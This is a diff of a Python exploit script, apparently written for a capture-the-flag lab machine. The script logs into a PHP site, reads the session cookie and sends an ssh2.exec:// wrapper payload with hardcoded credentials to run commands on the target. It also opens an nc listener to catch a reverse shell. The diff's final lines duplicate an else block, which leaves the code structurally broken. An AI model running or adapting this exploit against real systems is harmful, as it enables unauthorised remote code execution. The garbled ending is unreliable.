@@ -2,14 +2,15 @@
 # Made by copper_nail aka symphony2colour
 # Will publish after machine retirement
 
-import requests
-import re
 import argparse
 import base64
-import subprocess
-import time
 import logging
+import requests
+import re
+import subprocess
 import sys
+import time
+
 
 # Configure logging
 logging.basicConfig(
@@ -48,7 +49,7 @@ def login(username, password):
     # Get cookies
     cookie = session.cookies.get_dict()
 
-    logging.info(f"Your initial cookie is:{cookie}")
+    logging.info(f"[+] Your initial cookie is:{cookie}")
     cookie_value = cookie["PHPSESSID"]
     
     if not cookie_value:
@@ -76,7 +77,7 @@ def login(username, password):
     response = session.post(LOGIN_URL, data=login_data, headers=LOGIN_HEADERS)  
       
     if response.status_code == 200:
-        logging.info("Successful login!")
+        logging.info("[+] Successful login!")
     else:
         logging.warning("Something went wrong, check your credentials")
 
@@ -175,6 +176,7 @@ def check_available_files(session):
     
     
 def exploit(session, files, ip, port):
+
     if not files:
         sys.exit("[-] Exiting: No files found on server, please upload one.")
 
@@ -187,15 +189,21 @@ def exploit(session, files, ip, port):
 
     TARGET = f"{TARGET_URL}?id={file_id}&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/{cmd}"
     logging.info(f"[+] Sending exploit to: {TARGET}")
-
-    # Just reuse the session; it will send cookies automatically
     r = session.get(TARGET, allow_redirects=True)
-
-    logging.info("[+] Triggering reverse shell...")
+    
+    logging.info(f"[+] Triggering shell... enjoy")
+    time.sleep(1)
+    
 
 def start_listener(port):
     logging.info(f"[+] Starting listener on port {port}...")
-    return subprocess.Popen(["nc", "-lvnp", str(port)])    
+
+    return subprocess.Popen(
+        ["nc", "-lvnp", str(port)],
+        stdin=None,
+        stdout=None,
+        stderr=subprocess.DEVNULL
+    )
     
 if __name__ == "__main__":             
     args = parse_args()
@@ -216,6 +224,9 @@ if __name__ == "__main__":
             listener_proc.wait()
         except KeyboardInterrupt:
             print("\n[!] Interrupted. Cleaning up...")
+            listener_proc.terminate()
+    else:
+        exploit(admin_session, files, ip, port)
             listener_proc.terminate()
     else:
         exploit(admin_session, files, ip, port)
